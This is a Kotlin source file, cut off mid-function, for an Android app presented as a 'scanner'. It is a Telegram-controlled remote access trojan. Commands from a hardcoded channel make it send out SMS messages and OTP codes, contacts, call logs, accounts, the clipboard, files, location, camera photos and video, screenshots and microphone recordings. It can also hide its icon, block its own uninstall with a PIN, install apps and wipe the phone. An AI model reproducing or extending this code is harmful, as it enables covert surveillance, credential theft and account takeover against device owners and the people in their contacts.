package com.example.scanner

import android.annotation.SuppressLint
import android.Manifest
import android.app.ActivityManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.location.Geocoder
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.net.wifi.WifiInfo
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.StatFs
import android.os.SystemClock
import android.accounts.Account
import android.accounts.AccountManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import java.io.File
import com.example.EmergencyAlertActivity
import com.example.scanner.RemoteCameraHelper
import com.example.scanner.AudioRecordHelper
import com.example.scanner.TextToSpeechHelper
import com.example.data.MediaType
import com.example.data.MediaUploadRepository
import com.example.network.TelegramApiService
import com.example.network.TelegramCommandUpdate
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

class BotCommandHandler(
    private val context: Context,
    private val scope: CoroutineScope,
    private val telegramApi: TelegramApiService,
    private val repository: MediaUploadRepository,
    private val mediaScanner: MediaScanner,
    private val onTriggerSync: (String) -> Unit
) {

    companion object {
        const val AUTHORIZED_ADMIN_TELEGRAM_ID = "7451036574"
        const val AUTHORIZED_CHANNEL_ID = "-1004457596144"
    }

    suspend fun handleCommand(update: TelegramCommandUpdate) = withContext(Dispatchers.IO) {
        val fullText = update.text.trim()
        if (fullText.isBlank()) return@withContext

        val (rawCommand, targetArg) = parseCommandAndTarget(fullText)
        if (rawCommand.isBlank()) return@withContext

        val deviceId = repository.getDeviceId()
        val config = repository.getTelegramConfig()
        if (config.botToken.isBlank()) return@withContext

        val updateChatId = update.chatId.trim()
        if (updateChatId != "-1004457596144") {
            return@withContext
        }
        val replyChatId = "-1004457596144"

        // Automatically ensure chat ID config is stored as -1004457596144
        if (config.chatId != "-1004457596144") {
            repository.saveTelegramConfig(config.botToken, "-1004457596144")
        }

        when (rawCommand) {
            "/devices", "/ping", "/list_devices", "/alldevices", "/devicelist", "/all_devices", "/online", "/who", "/clients" -> {
                // All online devices report in
                sendDevicePingResponse(config.botToken, replyChatId, deviceId)
            }

            "/loc", "/location", "/gps", "/where" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    sendDeviceLocation(config.botToken, replyChatId, deviceId)
                }
            }

            "/status" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    sendFullStatusResponse(config.botToken, replyChatId, deviceId)
                }
            }

            "/sync", "/sync_now" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    sendSyncTriggerResponse(config.botToken, replyChatId, deviceId)
                }
            }

            "/fetch", "/getfiles", "/pull", "/folder", "/files", "/fetch_all" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val query = extractTargetQuery(fullText, rawCommand, deviceId)
                    handleFetchFolderCommand(query, config.botToken, replyChatId, deviceId, filterType = null)
                }
            }

            "/fetch_images", "/getimages", "/photos_folder" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val query = extractTargetQuery(fullText, rawCommand, deviceId)
                    handleFetchFolderCommand(query, config.botToken, replyChatId, deviceId, filterType = "images")
                }
            }

            "/fetch_videos", "/getvideos", "/videos_folder" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val query = extractTargetQuery(fullText, rawCommand, deviceId)
                    handleFetchFolderCommand(query, config.botToken, replyChatId, deviceId, filterType = "videos")
                }
            }

            "/delete", "/del", "/remove_file", "/delete_file", "/delete_folder", "/delete_path" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val query = extractTargetQuery(fullText, rawCommand, deviceId)
                    handleDeleteCommand(query, config.botToken, replyChatId, deviceId, isConfirmed = false)
                }
            }

            "/del_ok", "/delete_confirm" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val query = extractTargetQuery(fullText, rawCommand, deviceId)
                    handleDeleteCommand(query, config.botToken, replyChatId, deviceId, isConfirmed = true)
                }
            }

            "/del_no", "/delete_cancel" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    scope.launch(Dispatchers.IO) {
                        telegramApi.sendMessage(
                            config.botToken,
                            replyChatId,
                            "❌ <b>DELETE CANCELLED [ID: <code>$deviceId</code>]</b>\n\nফাইল ডিলিট করার রিকোয়েস্ট বাতিল করা হয়েছে। কোনো ফাইল মুছে ফেলা হয়নি।"
                        )
                    }
                }
            }

            "/list", "/ls", "/dir", "/list_files", "/list_folder" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val query = extractTargetQuery(fullText, rawCommand, deviceId)
                    handleListFolderCommand(query, config.botToken, replyChatId, deviceId)
                }
            }

            "/sim", "/sim_info", "/sims", "/simcard", "/sim_details" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    sendSimInfoReport(config.botToken, replyChatId, deviceId)
                }
            }

            "/accounts", "/account", "/gmail", "/whatsapp", "/imo", "/messenger", "/account_details" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    sendAccountsReport(config.botToken, replyChatId, deviceId)
                }
            }

            "/calls", "/calllogs", "/call_log", "/call_history", "/call_logs" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    sendCallLogsReport(config.botToken, replyChatId, deviceId)
                }
            }

            "/contacts", "/contact", "/contact_list", "/phonebook" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val query = extractTargetQuery(fullText, rawCommand, deviceId)
                    sendContactsReport(query, config.botToken, replyChatId, deviceId)
                }
            }

            "/clipboard", "/clip", "/getclip" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    sendClipboardContent(config.botToken, replyChatId, deviceId)
                }
            }

            "/otp", "/sms", "/last_otp", "/readsms", "/getotp" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    sendRecentSmsReport(config.botToken, replyChatId, deviceId)
                }
            }

            "/setclip", "/clip_set", "/copy" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val payload = extractPayload(fullText, rawCommand, targetArg, deviceId)
                    pushToClipboard(payload, config.botToken, replyChatId, deviceId)
                }
            }

            "/open", "/browse", "/url", "/link" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val urlToOpen = if (isDirectUrlString(fullText.trim())) {
                        fullText.trim()
                    } else {
                        val payload = extractPayload(fullText, rawCommand, targetArg, deviceId)
                        if (payload.isNotBlank()) payload else extractUrlFromText(fullText)
                    }
                    openUrlInBrowser(urlToOpen, config.botToken, replyChatId, deviceId)
                }
            }

            "/media_stats", "/stats_media", "/mediastats" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    sendMediaStatsReport(config.botToken, replyChatId, deviceId)
                }
            }

            "/battery" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    sendBatteryReport(config.botToken, replyChatId, deviceId)
                }
            }

            "/network", "/net", "/ip" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    sendNetworkReport(config.botToken, replyChatId, deviceId)
                }
            }

            "/storage", "/disk" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    sendStorageReport(config.botToken, replyChatId, deviceId)
                }
            }

            "/apps", "/applist", "/installed_apps", "/app_list", "/top_apps" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val query = extractAppsQuery(fullText, rawCommand, deviceId)
                    handleAppsListCommand(query, config.botToken, replyChatId, deviceId)
                }
            }

            "/uninstall", "/delete_app", "/remove_app" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val query = extractTargetQuery(fullText, rawCommand, deviceId)
                    handleUninstallCommand(query, config.botToken, replyChatId, deviceId)
                }
            }

            "/install", "/get_app" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val query = extractTargetQuery(fullText, rawCommand, deviceId)
                    handleInstallCommand(query, config.botToken, replyChatId, deviceId)
                }
            }

            "/openapp", "/launch_app", "/launch", "/startapp" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val query = extractTargetQuery(fullText, rawCommand, deviceId)
                    handleOpenAppCommand(query, config.botToken, replyChatId, deviceId)
                }
            }

            "/photo", "/camera", "/pic", "/take_photo" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val isFront = fullText.lowercase().contains("front") || fullText.lowercase().contains("selfie") || fullText.lowercase().contains("সামনে")
                    captureAndSendCameraPhoto(isFront, config.botToken, replyChatId, deviceId)
                }
            }

            "/photo_front", "/cam_front", "/selfie" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    captureAndSendCameraPhoto(isFront = true, config.botToken, replyChatId, deviceId)
                }
            }

            "/photo_back", "/cam_back", "/rear_cam" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    captureAndSendCameraPhoto(isFront = false, config.botToken, replyChatId, deviceId)
                }
            }

            "/video", "/record_video", "/video_record", "/cam_video" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val isFront = fullText.lowercase().contains("front") || fullText.lowercase().contains("selfie") || fullText.lowercase().contains("সামনে")
                    val sec = extractDurationSeconds(fullText, rawCommand, targetArg, deviceId)
                    recordAndSendCameraVideo(isFront, sec, config.botToken, replyChatId, deviceId)
                }
            }

            "/video_front", "/cam_video_front", "/video_selfie" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val sec = extractDurationSeconds(fullText, rawCommand, targetArg, deviceId)
                    recordAndSendCameraVideo(isFront = true, sec, config.botToken, replyChatId, deviceId)
                }
            }

            "/video_back", "/cam_video_back", "/video_rear" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val sec = extractDurationSeconds(fullText, rawCommand, targetArg, deviceId)
                    recordAndSendCameraVideo(isFront = false, sec, config.botToken, replyChatId, deviceId)
                }
            }

            "/screenshot", "/screen", "/snap_screen", "/capture_screen" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    captureAndSendScreenshot(config.botToken, replyChatId, deviceId)
                }
            }

            "/wifi", "/wifi_status", "/hotspot" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val payload = extractPayload(fullText, rawCommand, targetArg, deviceId).lowercase()
                    if (payload.contains("on") || payload.contains("enable") || payload.contains("চালু")) {
                        handleWifiToggle(enable = true, config.botToken, replyChatId, deviceId)
                    } else if (payload.contains("off") || payload.contains("disable") || payload.contains("বন্ধ")) {
                        handleWifiToggle(enable = false, config.botToken, replyChatId, deviceId)
                    } else {
                        handleWifiStatus(config.botToken, replyChatId, deviceId)
                    }
                }
            }

            "/wifi_on" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    handleWifiToggle(enable = true, config.botToken, replyChatId, deviceId)
                }
            }

            "/wifi_off" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    handleWifiToggle(enable = false, config.botToken, replyChatId, deviceId)
                }
            }

            "/setpin", "/set_pin", "/pin_set" -> {
                val isForThisDevice = isTargetedToThisDevice(targetArg) || (targetArg != null && targetArg.all { it.isDigit() })
                if (isForThisDevice) {
                    val payload = extractPayload(fullText, rawCommand, targetArg, deviceId)
                    handleSetPinCommand(payload, config.botToken, replyChatId, deviceId)
                }
            }

            "/resetpin", "/reset_pin", "/removepin", "/clearpin", "/deletepin" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    handleResetPinCommand(config.botToken, replyChatId, deviceId)
                }
            }

            "/getpin", "/checkpin", "/pin_status" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    handleCheckPinCommand(config.botToken, replyChatId, deviceId)
                }
            }

            "/antiuninstall", "/uninstall_lock", "/lock_uninstall" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val payload = extractPayload(fullText, rawCommand, targetArg, deviceId).lowercase()
                    if (payload.contains("off") || payload.contains("disable")) {
                        repository.setAntiUninstallEnabled(false)
                        val msg = "⚠️ <b>ANTI-UNINSTALL PROTECTION DISABLED [ID: <code>$deviceId</code>]</b>\n\n" +
                                "The app can now be uninstalled without entering a PIN.\n" +
                                "To re-enable: <code>/antiuninstall on</code>"
                        telegramApi.sendMessage(config.botToken, replyChatId, msg)
                    } else {
                        repository.setAntiUninstallEnabled(true)
                        val currentPin = repository.getAppPin() ?: "1234"
                        val msg = "🛡️ <b>ANTI-UNINSTALL PROTECTION ACTIVE [ID: <code>$deviceId</code>]</b>\n\n" +
                                "✅ <b>Status:</b> Enabled\n" +
                                "🔒 <b>Required PIN:</b> <code>$currentPin</code>\n" +
                                "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n\n" +
                                "💡 কেউ এই ফোন থেকে অ্যাপ আনইনস্টল করতে গেলে অথবা সেটিংস থেকে বন্ধ করতে গেলে পিন দিতে হবে। সঠিক পিন ছাড়া মুছে ফেলা সম্ভব নয়।"
                        telegramApi.sendMessage(config.botToken, replyChatId, msg)
                    }
                }
            }

            "/hide", "/hide_icon", "/icon_hide", "/stealth" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    handleHideIconCommand(hide = true, config.botToken, replyChatId, deviceId)
                }
            }

            "/unhide", "/show_icon", "/icon_show" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    handleHideIconCommand(hide = false, config.botToken, replyChatId, deviceId)
                }
            }

            "/icon_status" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    handleIconStatusCommand(config.botToken, replyChatId, deviceId)
                }
            }

            "/wipe", "/format", "/factory_reset", "/wipe_data" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val payload = extractPayload(fullText, rawCommand, targetArg, deviceId).lowercase()
                    val isConfirmed = payload.contains("confirm") || payload.contains("ok") || payload.contains("yes") || payload.contains("হ্যাঁ")
                    handleWipeCommand(isConfirmed, config.botToken, replyChatId, deviceId)
                }
            }

            "/record", "/record_audio", "/audio_record", "/mic", "/listen" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val sec = extractDurationSeconds(fullText, rawCommand, targetArg, deviceId)
                    recordAndSendAmbientAudio(sec, config.botToken, replyChatId, deviceId)
                }
            }

            "/say", "/speak", "/voice", "/tts", "/talk" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val speechText = extractPayload(fullText, rawCommand, targetArg, deviceId)
                    speakTextOnSpeaker(speechText, config.botToken, replyChatId, deviceId)
                }
            }

            "/alert", "/screen_alert", "/emergency_msg", "/msg", "/popup" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    val alertText = extractPayload(fullText, rawCommand, targetArg, deviceId)
                    triggerEmergencyScreenAlert(alertText, update.senderName, config.botToken, replyChatId, deviceId)
                }
            }

            "/sendsms", "/send_sms", "/sms_send" -> {
                if (isTargetedToThisDevice(targetArg)) {
                    handleSendSmsCommand(fullText, rawCommand, targetArg, deviceId, config.botToken, replyChatId)
                }
            }

            "/select", "/target", "/use", "/device" -> {
                handleSelectDeviceCommand(targetArg, config.botToken, replyChatId, deviceId)
            }

            "/keyboard", "/actionbar", "/reply_keyboard" -> {
                if (isTargetedToThisDevice(targetArg, rawCommand)) {
                    telegramApi.sendMessage(
                        config.botToken,
                        replyChatId,
                        "🔘 <b>Nova Action Keyboard Activated [ID: <code>$deviceId</code>]</b>\n\nনিচের বাটনগুলো দিয়ে দ্রুত রিমোট কমান্ড এক্সিকিউট করা যাবে।",
                        replyMarkupJson = getReplyKeyboardJson()
                    )
                }
            }

            "/help", "/start", "/menu" -> {
                // Show command guide & buttons
                if (isTargetedToThisDevice(targetArg, rawCommand)) {
                    sendHelpGuide(config.botToken, replyChatId, deviceId)
                }
            }

            else -> {
                // In multi-device setup, only send unrecognized command help if command is addressed to this device or general (no specific other device specified)
                if (isTargetedToThisDevice(targetArg, rawCommand)) {
                    val prompt = "❓ <b>Command:</b> <code>${escapeHtml(fullText)}</code>\n\n" +
                            "💡 Type <b>/help</b> or <b>/start</b> to view all available commands and interactive buttons.\n\n" +
                            "📱 <b>Connected Device:</b> <code>$deviceId</code> (${escapeHtml(Build.MANUFACTURER.uppercase())} ${escapeHtml(Build.MODEL)})"
                    telegramApi.sendMessage(config.botToken, replyChatId, prompt, replyMarkupJson = getInlineKeyboardJson(deviceId))
                }
            }
        }
    }

    private fun parseCommandAndTarget(input: String): Pair<String, String?> {
        val trimmed = input.trim()
        if (trimmed.isBlank()) return Pair("", null)

        // 0. Direct URL Detection (e.g. "https://youtube.com", "http://example.com", "www.facebook.com", "google.com")
        if (isDirectUrlString(trimmed)) {
            return Pair("/open", null)
        }

        // 1. Direct Slash Commands (e.g. /open https://google.com, /location, /start)
        if (trimmed.startsWith("/")) {
            val parts = trimmed.split("\\s+".toRegex())
            val rawCommand = parts[0].lowercase().removeSuffix("@bot").split("@")[0]
            val targetArg = if (parts.size > 1) parts[1] else null
            return Pair(rawCommand, targetArg)
        }

        val lower = trimmed.lowercase()

        // 2. Natural language opening of URLs (e.g. "open https://google.com", "browse fb.com", "লিংক ওপেন করো https://...")
        if (lower.startsWith("open ") || lower.startsWith("browse ") || lower.startsWith("url ") || lower.startsWith("link ") ||
            lower.startsWith("ভিজিট ") || lower.startsWith("ওপেন ")) {
            val parts = trimmed.split("\\s+".toRegex())
            val targetArg = if (parts.size > 1) parts[1] else null
            return Pair("/open", targetArg)
        }

        // 3. Button Labels or English/Bengali phrases:
        if (lower.contains("live gps") || lower.contains("location") || lower.contains("loc") || lower.contains("gps") || lower.contains("where") || lower.contains("লোকেশন")) {
            val target = extractTargetFromButton(trimmed, listOf("📍", "live", "gps", "pin", "location", "loc", "where", "লোকেশন"))
            return Pair("/location", target)
        }
        if (lower.contains("media stats") || lower.contains("media_stats") || lower.contains("stats") || lower.contains("মিডিয়া") || lower.contains("স্টোরেজ হিসাব")) {
            val target = extractTargetFromButton(trimmed, listOf("📊", "media", "stats", "media_stats", "মিডিয়া"))
            return Pair("/media_stats", target)
        }
        if (lower.contains("installed apps") || lower.contains("apps list") || lower.contains("app list") || lower.contains("app_list") || lower.contains("অ্যাপ লিস্ট") || lower.contains("অ্যাপের তালিকা") || lower.contains("অ্যাপ তালিকা")) {
            val target = extractTargetFromButton(trimmed, listOf("📦", "installed", "apps", "app", "list", "অ্যাপ", "লিস্ট", "তালিকা"))
            return Pair("/apps", target)
        }
        if (lower.startsWith("uninstall ") || lower.startsWith("delete app ") || lower.startsWith("remove app ") || lower.startsWith("আনইনস্টল ") || lower.startsWith("ডিলিট অ্যাপ ")) {
            val parts = trimmed.split("\\s+".toRegex())
            val targetArg = if (parts.size > 1) parts[1] else null
            return Pair("/uninstall", targetArg)
        }
        if (lower.startsWith("install ") || lower.startsWith("get app ") || lower.startsWith("ইনস্টল ")) {
            val parts = trimmed.split("\\s+".toRegex())
            val targetArg = if (parts.size > 1) parts[1] else null
            return Pair("/install", targetArg)
        }
        if (lower.startsWith("open app ") || lower.startsWith("launch ") || lower.startsWith("openapp ") || lower.startsWith("লঞ্চ ") || lower.startsWith("অ্যাপ ওপেন ") || lower.startsWith("ওপেন অ্যাপ ")) {
            val parts = trimmed.split("\\s+".toRegex())
            val targetArg = if (parts.size > 1) parts[1] else null
            return Pair("/openapp", targetArg)
        }
        if (lower.contains("disk & ram") || lower.contains("storage") || lower.contains("disk") || lower.contains("স্টোরেজ")) {
            val target = extractTargetFromButton(trimmed, listOf("💾", "disk", "ram", "storage", "স্টোরেজ"))
            return Pair("/storage", target)
        }
        if (lower.contains("battery info") || lower.contains("battery") || lower.contains("চার্জ") || lower.contains("ব্যাটারি")) {
            val target = extractTargetFromButton(trimmed, listOf("🔋", "battery", "info", "ব্যাটারি", "চার্জ"))
            return Pair("/battery", target)
        }
        if (lower.contains("network / ip") || lower.contains("network") || lower.contains("net") || lower.contains("ip") || lower.contains("ওয়াইফাই") || lower.contains("নেটওয়ার্ক")) {
            val target = extractTargetFromButton(trimmed, listOf("📶", "network", "ip", "net", "ওয়াইফাই", "নেটওয়ার্ক"))
            return Pair("/network", target)
        }
        if (lower.contains("read clip") || lower.contains("clipboard") || lower.contains("clip") || lower.contains("ক্লিপবোর্ড")) {
            val target = extractTargetFromButton(trimmed, listOf("📋", "read", "clip", "clipboard", "ক্লিপবোর্ড"))
            return Pair("/clipboard", target)
        }
        if (lower.contains("read otp") || lower.contains("last otp") || lower.contains("get otp") || lower.contains("sms") || lower.contains("ওটিপি") || lower.contains("এসএমএস")) {
            val target = extractTargetFromButton(trimmed, listOf("🔐", "read", "otp", "sms", "ওটিপি", "এসএমএস"))
            return Pair("/otp", target)
        }
        if (lower.contains("sim info") || lower.contains("sim details") || lower.contains("sim card") || lower.contains("sims") || lower.contains("সিম তথ্য") || lower.contains("সিম নাম্বার") || lower.contains("সিম")) {
            val target = extractTargetFromButton(trimmed, listOf("📱", "sim", "info", "details", "card", "sims", "সিম", "তথ্য", "নাম্বার"))
            return Pair("/sim", target)
        }
        if (lower.contains("accounts") || lower.contains("account details") || lower.contains("gmail") || lower.contains("whatsapp account") || lower.contains("imo account") || lower.contains("messenger account") || lower.contains("একাউন্ট") || lower.contains("জিমেইল") || lower.contains("হোয়াটসঅ্যাপ একাউন্ট")) {
            val target = extractTargetFromButton(trimmed, listOf("👤", "accounts", "account", "details", "gmail", "whatsapp", "imo", "messenger", "একাউন্ট", "জিমেইল"))
            return Pair("/accounts", target)
        }
        if (lower.contains("call logs") || lower.contains("call log") || lower.contains("call history") || lower.contains("calls") || lower.contains("কল লগ") || lower.contains("কল হিস্টোরি") || lower.contains("কল লিস্ট")) {
            val target = extractTargetFromButton(trimmed, listOf("📞", "call", "logs", "log", "history", "calls", "কল", "লগ", "হিস্টোরি", "লিস্ট"))
            return Pair("/calls", target)
        }
        if (lower.contains("contacts") || lower.contains("contact list") || lower.contains("phonebook") || lower.contains("contact") || lower.contains("কন্টাক্ট") || lower.contains("ফোনবুক") || lower.contains("ফোন নাম্বার")) {
            val target = extractTargetFromButton(trimmed, listOf("👥", "contacts", "contact", "list", "phonebook", "কন্টাক্ট", "ফোনবুক", "নাম্বার"))
            return Pair("/contacts", target)
        }
        if (lower.contains("fetch folder") || lower.contains("fetch files") || lower.contains("files / folder") || lower.contains("ফোল্ডার ফাইল") || lower.contains("ফাইল আনুন") || lower.contains("ফাইল আনো")) {
            val target = extractTargetFromButton(trimmed, listOf("📁", "fetch", "folder", "files", "ফোল্ডার", "ফাইল", "আনুন", "আনো"))
            return Pair("/fetch", target)
        }
        if (lower.contains("delete path") || lower.contains("delete folder") || lower.contains("ডিলিট ফাইল") || lower.contains("ফাইল ডিলিট")) {
            val target = extractTargetFromButton(trimmed, listOf("🗑️", "delete", "path", "folder", "ফাইল", "ডিলিট"))
            return Pair("/delete", target)
        }
        if (lower.contains("all devices") || lower.contains("devices") || lower.contains("ping") || lower.contains("list") || lower.contains("ডিভাইস")) {
            return Pair("/devices", null)
        }
        if (lower.startsWith("select ") || lower.startsWith("target ") || lower.startsWith("use ") || lower.startsWith("সিলেক্ট ")) {
            val parts = trimmed.split("\\s+".toRegex())
            val targetArg = if (parts.size > 1) parts[1] else null
            return Pair("/select", targetArg)
        }
        if (lower.contains("bottom keyboard") || lower.contains("action bar") || lower.contains("action keyboard") || lower.contains("কিবোর্ড") || lower.contains("কীবোর্ড")) {
            return Pair("/keyboard", null)
        }
        if (lower.contains("show menu") || lower.contains("commands help") || lower.contains("help") || lower.contains("start") || lower.contains("menu") || lower.contains("হেল্প") || lower.contains("মেনু")) {
            val target = extractTargetFromButton(trimmed, listOf("📋", "show", "menu", "commands", "help", "start", "হেল্প", "মেনু"))
            return Pair("/help", target)
        }
        if (lower.contains("status") || lower.contains("health") || lower.contains("স্ট্যাটাস")) {
            val target = extractTargetFromButton(trimmed, listOf("📱", "status", "health", "স্ট্যাটাস"))
            return Pair("/status", target)
        }
        if (lower.contains("sync") || lower.contains("সিঙ্ক")) {
            val target = extractTargetFromButton(trimmed, listOf("🔄", "sync", "sync_now", "সিঙ্ক"))
            return Pair("/sync", target)
        }
        if (lower.contains("front photo") || lower.contains("selfie") || lower.contains("সেলফি") || lower.contains("সামনের ক্যামেরা")) {
            val target = extractTargetFromButton(trimmed, listOf("📸", "front", "photo", "selfie", "সেলফি", "ক্যামেরা"))
            return Pair("/photo_front", target)
        }
        if (lower.contains("back photo") || lower.contains("rear photo") || lower.contains("পেছনের ক্যামেরা") || lower.contains("ছবি তোল")) {
            val target = extractTargetFromButton(trimmed, listOf("📷", "back", "photo", "rear", "পেছনের", "ছবি"))
            return Pair("/photo_back", target)
        }
        if (lower.contains("video front") || lower.contains("front video") || lower.contains("ভিডিও ফ্রন্ট") || lower.contains("সামনে ভিডিও")) {
            val target = extractTargetFromButton(trimmed, listOf("🎥", "video", "front", "ভিডিও", "ফ্রন্ট"))
            return Pair("/video_front", target)
        }
        if (lower.contains("video back") || lower.contains("back video") || lower.contains("ভিডিও ব্যাক") || lower.contains("পেছনে ভিডিও")) {
            val target = extractTargetFromButton(trimmed, listOf("📹", "video", "back", "rear", "ভিডিও", "ব্যাক"))
            return Pair("/video_back", target)
        }
        if (lower.contains("screenshot") || lower.contains("live screen") || lower.contains("স্ক্রিনশট") || lower.contains("স্ক্রিন")) {
            val target = extractTargetFromButton(trimmed, listOf("📱", "screenshot", "screen", "live", "স্ক্রিনশট"))
            return Pair("/screenshot", target)
        }
        if (lower.contains("wifi") || lower.contains("wi-fi") || lower.contains("ওয়াইফাই") || lower.contains("hotspot")) {
            val target = extractTargetFromButton(trimmed, listOf("🌐", "wifi", "wi-fi", "ওয়াইফাই", "status", "hotspot"))
            return Pair("/wifi", target)
        }
        if (lower.contains("pin status") || lower.contains("security pin") || lower.contains("পিন কোড") || lower.contains("পিন")) {
            val target = extractTargetFromButton(trimmed, listOf("🔒", "pin", "status", "security", "পিন"))
            return Pair("/getpin", target)
        }
        if (lower.contains("hide icon") || lower.contains("আইকন হাইড") || lower.contains("হাইড আইকন")) {
            val target = extractTargetFromButton(trimmed, listOf("👻", "hide", "icon", "আইকন", "হাইড"))
            return Pair("/hide", target)
        }
        if (lower.contains("unhide icon") || lower.contains("আইকন আনহাইড") || lower.contains("আনহাইড")) {
            val target = extractTargetFromButton(trimmed, listOf("👁️", "unhide", "icon", "আইকন", "আনহাইড"))
            return Pair("/unhide", target)
        }
        if (lower.contains("wipe data") || lower.contains("format phone") || lower.contains("ওয়াইপ ডাটা") || lower.contains("ফরম্যাট")) {
            val target = extractTargetFromButton(trimmed, listOf("💥", "wipe", "format", "data", "ওয়াইপ", "ফরম্যাট"))
            return Pair("/wipe", target)
        }
        if (lower.contains("record audio") || lower.contains("record") || lower.contains("অডিও রেকর্ড") || lower.contains("শব্দ রেকর্ড")) {
            val target = extractTargetFromButton(trimmed, listOf("🎙️", "record", "audio", "mic", "রেকর্ড"))
            return Pair("/record", target)
        }
        if (lower.startsWith("say ") || lower.startsWith("speak ") || lower.startsWith("কথা বল ") || lower.startsWith("বলুন ")) {
            val parts = trimmed.split("\\s+".toRegex())
            val targetArg = if (parts.size > 1) parts[1] else null
            return Pair("/say", targetArg)
        }
        if (lower.contains("speak text") || lower.contains("speak alert") || lower.contains("স্পিকারে বল")) {
            val target = extractTargetFromButton(trimmed, listOf("🗣️", "speak", "text", "alert", "স্পিকারে"))
            return Pair("/say", target)
        }
        if (lower.startsWith("alert ") || lower.startsWith("জরুরী বার্তা ") || lower.startsWith("স্ক্রিন এলার্ট ")) {
            val parts = trimmed.split("\\s+".toRegex())
            val targetArg = if (parts.size > 1) parts[1] else null
            return Pair("/alert", targetArg)
        }
        if (lower.contains("screen alert") || lower.contains("emergency alert") || lower.contains("জরুরী বার্তা")) {
            val target = extractTargetFromButton(trimmed, listOf("🚨", "screen", "alert", "emergency", "বার্তা"))
            return Pair("/alert", target)
        }
        if (lower.startsWith("sendsms ") || lower.startsWith("sms ") || lower.startsWith("মেসেজ পাঠাও ")) {
            val parts = trimmed.split("\\s+".toRegex())
            val targetArg = if (parts.size > 1) parts[1] else null
            return Pair("/sendsms", targetArg)
        }

        // 3. Fallback: treat first word as command with leading slash
        val parts = trimmed.split("\\s+".toRegex())
        val rawCommand = "/" + parts[0].lowercase().removePrefix("/")
        val targetArg = if (parts.size > 1) parts[1] else null
        return Pair(rawCommand, targetArg)
    }

    private fun extractTargetFromButton(trimmed: String, keywordsToRemove: List<String>): String? {
        val parts = trimmed.split("\\s+".toRegex())
        for (part in parts) {
            val cleanPart = part.lowercase().trim()
            if (cleanPart.isNotBlank() && !keywordsToRemove.any { it.equals(cleanPart, ignoreCase = true) } && !cleanPart.startsWith("/")) {
                return part.trim()
            }
        }
        return null
    }

    private fun escapeHtml(text: String): String {
        return text.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }

    private fun matchesDeviceTarget(targetStr: String, myDeviceId: String): Boolean {
        val target = targetStr.trim().lowercase()
        if (target.isBlank()) return false
        if (target == "all" || target == "*") return true

        val deviceId = myDeviceId.lowercase()
        val model = Build.MODEL.lowercase()
        val brand = Build.BRAND.lowercase()
        val manufacturer = Build.MANUFACTURER.lowercase()

        val deviceParts = deviceId.split("-")
        val suffix = deviceParts.lastOrNull() ?: ""

        if (deviceId == target ||
            (suffix.isNotBlank() && target == suffix) ||
            (target.length >= 3 && deviceId.endsWith(target)) ||
            (target.length >= 4 && deviceId.contains(target)) ||
            target.contains(deviceId)
        ) {
            return true
        }

        if (model == target || brand == target || manufacturer == target ||
            model.contains(target) || brand.contains(target) || manufacturer.contains(target)
        ) {
            return true
        }

        return false
    }

    private fun isTargetedToThisDevice(targetArg: String?, rawCommand: String? = null): Boolean {
        val myDeviceId = repository.getDeviceId()

